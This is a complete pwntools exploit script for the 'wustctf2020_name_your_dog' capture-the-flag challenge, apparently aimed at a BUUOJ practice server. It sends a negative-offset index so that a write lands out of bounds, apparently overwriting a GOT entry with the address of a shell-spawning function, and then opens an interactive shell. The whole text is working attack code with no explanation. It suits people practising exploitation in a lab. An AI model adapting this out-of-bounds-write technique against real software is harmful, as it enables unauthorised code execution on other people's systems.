#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'i386'


local = 0
if local == 1:
    r=process('./wustctf2020_name_your_dog')
    gdb.attach(r,"b * 0x804867A")
else:
    r = remote('node4.buuoj.cn',29711)

elf= ELF('./wustctf2020_name_your_dog')

r.recvuntil('which?')
r.sendline(str(0x20000000-7))
r.recvuntil('plz:')
r.sendline(p32(0x80485cb))

r.interactive()
